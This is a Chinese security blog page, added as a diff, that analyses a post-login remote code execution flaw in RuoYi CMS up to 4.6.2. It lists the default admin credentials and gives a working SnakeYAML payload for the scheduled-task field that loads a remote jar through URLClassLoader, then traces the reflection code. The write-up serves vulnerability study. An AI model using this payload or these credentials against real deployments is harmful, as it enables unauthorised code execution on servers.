@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Blog Of SEVENTEEN</title>
+
+    <link rel = "Shortcut Icon" href="../img/favicon.ico">
+
+    <!-- Bootstrap core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom fonts for this template -->
+    <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet'
+          type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800'
+          rel='stylesheet' type='text/css'>
+
+    <!-- Custom styles for this template -->
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Code highlight-->
+    <link rel="stylesheet" href="../highlight/styles/ashes.min.css">
+    
+    <!-- fancybox-->
+    <link  href="../css/jquery.fancybox.min.css" rel="stylesheet">
+    
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+        <a class="navbar-brand" href="../index.html">Index</a>
+        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse"
+                data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false"
+                aria-label="Toggle navigation">
+            Menu
+            <i class="fas fa-bars"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="../index.html">Home</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../about.html">About</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../contact.html">Contact</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+<!-- Page Header -->
+<header class="masthead" style="background-image: url('../img/post-bg.jpeg')">
+    <div class="overlay"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <div class="post-heading">
+                    <h1>若依CMS后台RCE漏洞分析</h1>
+                    <h2 class="subheading">若依CMS后台RCE漏洞分析</h2>
+                    <span class="meta">Posted by
+              <a href="#">SEVENTEEN</a>
+              on April 4, 2022</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+
+                <h2 class="section-heading">前言</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;有了前面的一些思路后，继续积累下CMS的漏洞的思路。</p>
+                	
+                	
+                	<h2 class="section-heading">影响范围</h2>
+                	
+                	<p>&nbsp;&nbsp;&nbsp;RuoYi <= 4.6.2</p>
+                  
+             
+            <h2 class="section-heading">环境部署</h2>
+            
+            <p>&nbsp;&nbsp;&nbsp;直接到官网看文档(再根据报错改下路径就可以了)，我下载的是4.6.0版本。
+            	后台管理默认账号密码是admin/admin123或者ry/admin123。</p>
+            
+            <div>
+            	
+            	<pre class='hljs'><code><span class="hljs-label">http:</span>//doc.ruoyi.vip/ruoyi/document/hjbs.html#<span class="hljs-var_expand">%E8%</span>BF<span class="hljs-var_expand">%90%</span>E8<span class="hljs-var_expand">%A1%</span><span class="hljs-number">8</span>C<span class="hljs-var_expand">%E7%</span>B3<span class="hljs-var_expand">%BB%</span>E7<span class="hljs-var_expand">%BB%</span><span class="hljs-number">9</span>F</code></pre>
+            	
+            	</div>
+            	
+            	
+            	<h2 class="section-heading">漏洞复现</h2>
+            	
+            	
+            	<p>&nbsp;&nbsp;&nbsp;首先登陆到后台，到系统监控中的定时任务中新建一个任务，在调用目标字符串输入payload。</p>
+            	
+            	
+            	<div>
+            		
+            		<pre class='hljs'><code><span class="hljs-preprocessor"># payload</span>
+org.yaml.snakeyaml.Yaml.load(<span class="hljs-string">'!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:8000/yaml-payload.jar"]]]]'</span>)</code></pre>
+            		
+            		</div>
+            	
+            	<a data-fancybox="gallery" href="../img/2022-4-4/1-1.jpg">
+                <img class="img-fluid" src="../img/2022-4-4/1-1.jpg" alt="">
+              </a>
+              
+              
+              <p>&nbsp;&nbsp;&nbsp;按readme中的说明改完执行的指令生成恶意payload，开启一个server。
+              	开完之后在若依这边开启定时任务，就可以发现指令被触发执行了。</p>
+            	
+            	<a data-fancybox="gallery" href="../img/2022-4-4/1-2.jpg">
+                <img class="img-fluid" src="../img/2022-4-4/1-2.jpg" alt="">
+              </a>
+              
+            	
+            	
+            	<h2 class="section-heading">漏洞分析</h2>
+            	
+            <p>&nbsp;&nbsp;&nbsp;payload非常像"绕过高版本JDK限制进行JNDI注入"一文中的其中一种绕过方法，
+            	看到这个功能点其实可以猜到这里就是一个反射的功能，下面来看一下payload的触发过程。
+            	首先来到com.ruoyi.quartz.util#JobInvokeUtil中，可以看到beanName和methodName获取到的内容，
+            	即payload最外层的类名和方法名。这里继续跟进一下参数methodParams = getMethodParams(invokeTarget)。</p>
+            	
+            	<a data-fancybox="gallery" href="../img/2022-4-4/1-3.jpg">
+                <img class="img-fluid" src="../img/2022-4-4/1-3.jpg" alt="">
+              </a>
+
+              <p>&nbsp;&nbsp;&nbsp;从注释中也可以看出这个方法的功能点，大概的一个流程是先获取最外层括号中的内容，
+              	接着判断字符串中是否含有单引号，如果有的话当作string类型参数。</p>
+            	
+            	<a data-fancybox="gallery" href="../img/2022-4-4/1-4.jpg">
+                <img class="img-fluid" src="../img/2022-4-4/1-4.jpg" alt="">
+              </a>  
+              
+              <p>&nbsp;&nbsp;&nbsp;使用isValidClassName判断是否是非法的类名，原理是判断类名中是否有.，
+              	如果有的话就为非法类名，走往else分支实例化类，再进行反射。</p>
+            	
+            	<a data-fancybox="gallery" href="../img/2022-4-4/1-5.jpg">
+                <img class="img-fluid" src="../img/2022-4-4/1-5.jpg" alt="">
+              </a>
+              
+              
+              
+                
+
+                            
+              
+              
+
+           
+                <h2 class="section-heading">There Is Nothing Below</h2>
+                <p>&nbsp;&nbsp;&nbsp;</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                </a>
+                <span class="caption text-muted">Turn at the next intersection.</span>
+
+                <blockquote class="blockquote">
+                </blockquote>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <ul class="list-inline text-center">
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; SEVENTEEN 2022</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- Bootstrap core JavaScript -->
+<script src="../vendor/jquery/jquery.min.js"></script>
+<script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+<!-- Custom scripts for this template -->
+<script src="../js/clean-blog.min.js"></script>
+
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+<script src="../js/jquery.fancybox.min.js"></script>
+                  
+</body>
+
+</html>
